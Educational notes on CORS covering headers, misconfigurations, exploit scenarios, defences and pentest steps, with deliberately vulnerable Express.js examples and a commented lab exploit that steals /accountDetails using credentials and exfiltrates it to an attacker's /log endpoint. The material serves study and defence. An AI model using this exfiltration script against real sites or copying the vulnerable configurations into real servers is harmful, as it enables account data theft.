### **What is Cross-Origin Resource Sharing (CORS)?**

**Cross-Origin Resource Sharing (CORS)** is a web security feature that allows controlled access to resources (e.g., APIs, fonts, or data) on a web server from a different domain (origin). Browsers enforce a **Same-Origin Policy (SOP)** by default, restricting web pages from making requests to a different domain unless explicitly permitted via CORS.

---

### **How CORS Works**

When a browser makes a cross-origin request, it performs one of two types of requests:

1. **Simple Requests:**
    
    - Performed directly without a preflight check.
    - Allowed if certain conditions are met, such as using HTTP methods like `GET` or `POST` with safe headers.
2. **Preflight Requests:**
    
    - For more complex interactions, the browser sends an `OPTIONS` request to the server to check whether the actual request is allowed.
    - If the server responds with appropriate headers, the browser proceeds with the actual request.

#### **Key CORS Headers:**

- **Access-Control-Allow-Origin:** Specifies which origins are allowed (`*` allows all).
- **Access-Control-Allow-Methods:** Specifies HTTP methods allowed for cross-origin requests.
- **Access-Control-Allow-Headers:** Specifies which headers can be sent in the request.
- **Access-Control-Allow-Credentials:** Indicates whether the response can expose credentials (e.g., cookies).

---

### **CORS Vulnerabilities**

CORS can become a security risk if misconfigured, potentially allowing unauthorized access to sensitive resources or user data.

#### **Common Misconfigurations:**

1. **Overly Permissive `Access-Control-Allow-Origin`:**
    
    - Using `*` (wildcard) for `Access-Control-Allow-Origin` allows any domain to access the resource. This is dangerous if sensitive data is exposed.
    - Example:
        
        ```http
        Access-Control-Allow-Origin: *
        ```
        
    - Exploitation: An attacker can make a malicious website send requests to the vulnerable server and gain access to sensitive data in the response.
2. **Dynamic Origin Reflection:**
    
    - Some servers reflect the `Origin` header value without proper validation, trusting any origin.
    - Example:
        
        ```http
        Access-Control-Allow-Origin: https://<origin_from_request>
        ```
        
    - Exploitation: An attacker can set the `Origin` to their malicious domain and gain access to sensitive information.
3. **Improper Use of `Access-Control-Allow-Credentials`:**
    
    - Setting `Access-Control-Allow-Credentials: true` allows cookies and other credentials to be included in cross-origin requests.
    - Exploitation: Combined with permissive `Access-Control-Allow-Origin`, this enables unauthorized access to authenticated resources.
4. **Exposing Sensitive Methods:**
    
    - Allowing dangerous HTTP methods like `DELETE`, `PUT`, or `PATCH` through `Access-Control-Allow-Methods`.
5. **Misconfigured Preflight Responses:**
    
    - Preflight responses may incorrectly allow origins or methods that shouldn't be authorized.

---

### **Exploits Against CORS**

Here are some common exploits targeting CORS misconfigurations:

#### 1. **Unauthorized Data Access**

- **Scenario:** An API endpoint exposes user data with an overly permissive `Access-Control-Allow-Origin: *`.
- **Attack:** An attacker creates a malicious website that sends a cross-origin `GET` request to the vulnerable API. If the API returns sensitive data in the response, the attacker can steal it.

#### 2. **Session Hijacking with Credentials**

- **Scenario:** `Access-Control-Allow-Credentials: true` is used with a permissive or dynamically reflected `Access-Control-Allow-Origin`.
- **Attack:**
    - The attacker crafts a malicious site that sends a cross-origin request.
    - If the victim is logged into the target application, the browser includes their session cookies.
    - The attacker can read the authenticated response.

#### 3. **CSRF via CORS**

- **Scenario:** A web application accepts cross-origin `POST` requests but doesn't properly validate the origin.
- **Attack:** The attacker tricks the victim into visiting a malicious site that makes a `POST` request to the target application (e.g., changing account details).

#### 4. **Preflight Abuse**

- **Scenario:** A server responds incorrectly to `OPTIONS` requests, granting access to unsafe methods or headers.
- **Attack:** The attacker can exploit this misconfiguration to send unauthorized `DELETE` or `PUT` requests.

---

### **Defending Against CORS Exploitation**

To prevent exploitation, follow these best practices:

1. **Restrict Origins:**
    
    - Avoid using `*` for `Access-Control-Allow-Origin`.
    - Explicitly specify trusted origins.
    - Example:
        
        ```http
        Access-Control-Allow-Origin: https://trusted-origin.com
        ```
        
2. **Avoid Dynamic Reflection:**
    
    - Do not blindly reflect the `Origin` header. Validate against a whitelist of trusted domains.
3. **Be Careful with Credentials:**
    
    - Use `Access-Control-Allow-Credentials: true` only if absolutely necessary.
    - Pair it with a specific, trusted origin.
4. **Limit Allowed Methods and Headers:**
    
    - Only allow necessary HTTP methods and headers in `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers`.
5. **Secure Preflight Responses:**
    
    - Ensure `OPTIONS` requests only allow intended origins, methods, and headers.
6. **Use HTTPS:**
    
    - Always enforce HTTPS to prevent MitM attacks.

---

### **Relevance to Penetration Testing**

Testing CORS is crucial in identifying potential data leaks or unauthorized access points in web applications. Here’s how a pentester might approach it:

1. **Check CORS Headers:**
    
    - Analyze responses to see if `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or other headers are misconfigured.
2. **Exploit Origin Reflection:**
    
    - Use tools like Burp Suite to craft requests with malicious `Origin` headers and observe if the server reflects them.
3. **Test with Credentials:**
    
    - Verify if `Access-Control-Allow-Credentials` exposes sensitive data when combined with permissive origins.
4. **Simulate CSRF via CORS:**
    
    - Attempt cross-origin requests to verify if unauthorized actions can be performed.
5. **Inspect API Responses:**
    
    - Check if sensitive information is exposed in responses to cross-origin requests.

By systematically testing and addressing these issues, organizations can significantly enhance the security of their web applications.

---

<br>

## More technical explanation & examples


Below is a simplified demonstration of a CORS vulnerability in a server-side application (e.g., an Express.js Node.js server) that lacks proper CORS restrictions. This allows a malicious website to make requests to the server and access sensitive data.

### Vulnerable CORS Configuration (Express.js Server)

```javascript
const express = require('express');
const app = express();

// Vulnerable CORS setup: allows all origins
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*'); // This is a vulnerability: allowing all origins
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

app.get('/sensitive-data', (req, res) => {
  // Simulating sensitive data exposure
  res.json({ secret: 'This is a sensitive piece of data!' });
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
```

### How the Vulnerability Works:

1. **CORS Misconfiguration**: The server has a very permissive CORS policy (`Access-Control-Allow-Origin: *`). This means that any website, regardless of its origin, can make requests to the server and potentially retrieve sensitive data.

2. **Malicious Website**: A malicious attacker can host a website that makes an AJAX request to the vulnerable server and fetch sensitive data, such as personal information or authentication tokens.

### Example of Malicious Website (JavaScript)

```javascript
// This code would be executed on the malicious website
fetch('http://localhost:3000/sensitive-data')
  .then(response => response.json())
  .then(data => {
    console.log('Sensitive data received:', data);
  })
  .catch(error => console.log('Error fetching data:', error));
```

### How It Works:
- The malicious website makes a request to the vulnerable server (`http://localhost:3000/sensitive-data`).
- Due to the `Access-Control-Allow-Origin: *` header, the server responds without checking the request's origin, which allows the malicious website to access the response containing sensitive data.

### To Fix the CORS Vulnerability:
A proper CORS configuration should restrict the allowed origins to only trusted domains. Here's an updated, secure CORS configuration:

```javascript
app.use((req, res, next) => {
  const allowedOrigins = ['http://trustedwebsite.com']; // Specify trusted origins
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});
```

By restricting the origins in this way, you ensure that only requests from trusted domains are allowed, mitigating the CORS vulnerability.


### **Cross-Origin Resource Sharing (CORS) Vulnerability with Origin Reflection**

A **CORS vulnerability** occurs when a web server misconfigures its CORS policy, allowing unauthorized or malicious origins to access sensitive data. 

### **What is Basic Origin Reflection?**
In CORS, the server decides whether to allow a request from a specific origin by checking the `Origin` header in the incoming request. In a **basic origin reflection vulnerability**, the server blindly reflects the `Origin` header value from the client without validating it, granting permission to any domain.

### **Example of a Vulnerable Server Configuration**

#### Vulnerable Code (Express.js Example):
```javascript
const express = require('express');
const app = express();

app.use((req, res, next) => {
    const origin = req.headers.origin; // Get the Origin header from the request
    res.setHeader('Access-Control-Allow-Origin', origin); // Reflect the origin without validation
    res.setHeader('Access-Control-Allow-Credentials', 'true'); // Allow cookies/credentials
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    next();
});

app.get('/sensitive-data', (req, res) => {
    res.json({ data: "This is sensitive information" });
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

#### How This Works:
1. The server **reflects the `Origin` header** from the request directly into the `Access-Control-Allow-Origin` response header without validation.
2. The server allows **cross-origin requests from any domain**, effectively bypassing CORS protections.

### **Exploitation Example**
An attacker creates a malicious website (`http://attacker.com`) and tricks the victim into visiting it while logged into the vulnerable application. Using JavaScript, the malicious site sends a cross-origin request to the application:

```javascript
fetch('https://vulnerable-site.com/sensitive-data', {
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    console.log(data); // Sensitive information is now accessible to the attacker
});
```

- The **Origin header** in the request will be `http://attacker.com`.
- The vulnerable server reflects this origin in `Access-Control-Allow-Origin`, allowing the malicious origin to access sensitive data.
- The server also includes `Access-Control-Allow-Credentials: true`, enabling cookies or session tokens to be sent with the request.

### **Impact**
The attacker can:
1. Access sensitive data (e.g., user profiles, financial info).
2. Perform unauthorized actions on behalf of the victim.

### **Mitigation**
1. **Validate Allowed Origins:** Only allow trusted origins using a whitelist:
   ```javascript
   const allowedOrigins = ['https://trusted-site.com'];
   if (allowedOrigins.includes(origin)) {
       res.setHeader('Access-Control-Allow-Origin', origin);
   }
   ```
2. **Avoid Wildcards with Credentials:** Never use `*` or reflect the `Origin` header when `Access-Control-Allow-Credentials` is enabled.
3. **Least Privilege:** Limit endpoints that require CORS and ensure sensitive endpoints are inaccessible via cross-origin requests.
4. **Security Testing:** Regularly test for CORS misconfigurations.

### exploit code & explanation
Here is your commented code, with explanations for each line:

```html
<html>
    <body>
        <!-- The main body of the HTML document -->
        <h1>Hello World!</h1>
        <!-- Displays a heading on the page -->

        <script>
            <!-- Start of the embedded JavaScript code -->

            // Create a new XMLHttpRequest object to make HTTP requests.
            var xhr = new XMLHttpRequest();

            // Define the URL for the target server where the request will be sent.
            var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net";

            // Define a function to handle the state change of the XMLHttpRequest object.
            xhr.onreadystatechange = function() {
                // Check if the request has completed (readyState == DONE).
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    // Send the response text from the previous request to the /log endpoint of the current origin.
                    fetch("/log?key=" + xhr.responseText);
                }
            };

            // Configure the XMLHttpRequest object to make a GET request to the account details endpoint.
            xhr.open('GET', url + "/accountDetails", true);

            // Indicate that the request should include credentials (cookies, authorization headers, etc.).
            xhr.withCredentials = true;

            // Send the configured HTTP GET request.
            xhr.send(null);

            <!-- End of the script -->
        </script>
    </body>
</html>
```

### Explanation of What the Code Does

1. **Creates a new XMLHttpRequest (`xhr`)**: This is used to send an HTTP request to a remote server (in this case, the `url` defined).
    
2. **Specifies the URL**: The `url` variable points to a remote target, and `/accountDetails` is appended to it for the request.
    
3. **Handles the Response (`xhr.onreadystatechange`)**:
    
    - The `onreadystatechange` function listens for changes in the request's `readyState`.
    - When the request completes (`readyState == DONE`), the response (`xhr.responseText`) is captured and sent to `/log` on the current domain using `fetch`.
4. **Sends the GET request**:
    
    - `xhr.open('GET', ...)` sets the request to be a GET request.
    - `xhr.withCredentials = true` includes cookies and other credentials for authenticated requests.
    - `xhr.send(null)` executes the request.

### **Security Note:**

This script demonstrates a Cross-Origin Resource Sharing (CORS) or Cross-Site Scripting (XSS)-like scenario where sensitive data (`xhr.responseText`) from the target server (`url`) is stolen and exfiltrated to a `/log` endpoint on the attacker's server. Such attacks are often used to exploit vulnerabilities in web applications.






























